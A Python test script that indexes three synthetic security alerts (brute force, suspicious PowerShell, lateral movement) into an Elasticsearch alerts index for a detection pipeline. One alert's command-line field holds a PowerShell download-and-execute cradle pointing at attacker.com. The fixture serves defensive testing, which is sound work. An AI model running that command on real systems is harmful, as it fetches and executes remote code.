#!/usr/bin/env python3
"""Create sample security alerts for testing."""

import sys
import os
from datetime import datetime, timezone, timedelta

# Add parent directory to path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.ingestion.elastic_client import ElasticClient


def create_sample_alerts():
    """Create realistic sample security alerts."""

    print("🔗 Connecting to Elasticsearch Serverless...")
    try:
        # Use default config path (config/config.yaml)
        client = ElasticClient()
        health = client.health()
        print(f"✅ Connected! Cluster status: {health.get('status')}")
    except Exception as e:
        print(f"❌ Connection failed: {e}")
        print("\n💡 Make sure:")
        print("   1. config/config.yaml is set up correctly")
        print("   2. API endpoint and key are correct")
        print("   3. Your Elasticsearch Serverless is running")
        return

    print("\n📝 Creating sample alerts...")

    # ✅ FIX: Use timezone-aware datetime instead of deprecated utcnow()
    now = datetime.now(timezone.utc)

    sample_alerts = [
        {
            "_source": {
                "@timestamp": now.isoformat(),
                "alert": {
                    "uuid": "alert-1",
                    "title": "Failed Login Attempt",
                    "rule": {
                        "id": "rule-1",
                        "name": "T1110 - Brute Force"
                    }
                },
                "event": {
                    "action": "authentication_failure",
                    "category": ["authentication"],
                    "type": ["start"],
                    "outcome": "failure"
                },
                "host": {
                    "name": "workstation-01",
                    "os": {
                        "name": "Windows",
                        "version": "10"
                    }
                },
                "user": {
                    "name": "admin",
                    "domain": "CORP"
                },
                "source": {
                    "ip": "192.168.1.100",
                    "port": 445
                },
                "destination": {
                    "ip": "10.0.0.1",
                    "port": 3389
                },
                "network": {
                    "protocol": "rdp"
                }
            }
        },
        {
            "_source": {
                "@timestamp": (now - timedelta(minutes=5)).isoformat(),
                "alert": {
                    "uuid": "alert-2",
                    "title": "Suspicious Powershell Execution",
                    "rule": {
                        "id": "rule-2",
                        "name": "T1059 - Command Line Interface"
                    }
                },
                "event": {
                    "action": "process_execution",
                    "category": ["process"],
                    "type": ["start"]
                },
                "host": {
                    "name": "workstation-02",
                    "os": {
                        "name": "Windows",
                        "version": "11"
                    }
                },
                "user": {
                    "name": "user",
                    "domain": "CORP"
                },
                "process": {
                    "name": "powershell.exe",
                    "pid": 2048,
                    "command_line": "powershell.exe -Command IEX(New-Object Net.WebClient).DownloadString('http://attacker.com/payload')"
                }
            }
        },
        {
            "_source": {
                "@timestamp": (now - timedelta(minutes=10)).isoformat(),
                "alert": {
                    "uuid": "alert-3",
                    "title": "Lateral Movement Detected",
                    "rule": {
                        "id": "rule-3",
                        "name": "T1021 - Remote Services"
                    }
                },
                "event": {
                    "action": "network_flow",
                    "category": ["network"],
                    "type": ["connection"]
                },
                "host": {
                    "name": "server-01",
                    "os": {
                        "name": "Windows",
                        "version": "Server 2019"
                    }
                },
                "source": {
                    "ip": "192.168.1.50",
                    "port": 50123
                },
                "destination": {
                    "ip": "192.168.1.60",
                    "port": 445
                },
                "network": {
                    "protocol": "smb",
                    "direction": "egress"
                }
            }
        }
    ]

    # Index alerts
    # ✅ FIX: Use 'create' operation for data streams instead of 'index'
    indexed = 0
    for idx, alert in enumerate(sample_alerts, 1):
        try:
            # Use client.client.index() with op_type='create' for data streams
            result = client.client.index(
                index=".alerts-security.alerts-default",
                document=alert["_source"],
                op_type="create"  # ✅ FIX: Use 'create' for data streams
            )
            print(f"  ✅ Created: alert-{idx} - {alert['_source']['alert']['title']}")
            indexed += 1
        except Exception as e:
            error_msg = str(e)[:100]
            print(f"  ⚠️  Failed alert-{idx}: {error_msg}")

    client.close()

    print(f"\n{'=' * 70}")
    print(f"✅ ALERTS CREATED")
    print(f"{'=' * 70}")
    print(f"Successfully indexed: {indexed}/{len(sample_alerts)} alerts")
    print(f"Index: .alerts-security.alerts-default")
    print(f"\n🎯 Next step - Process alerts:")
    print(f"   python scripts/process_live_alerts.py")


if __name__ == "__main__":
    create_sample_alerts()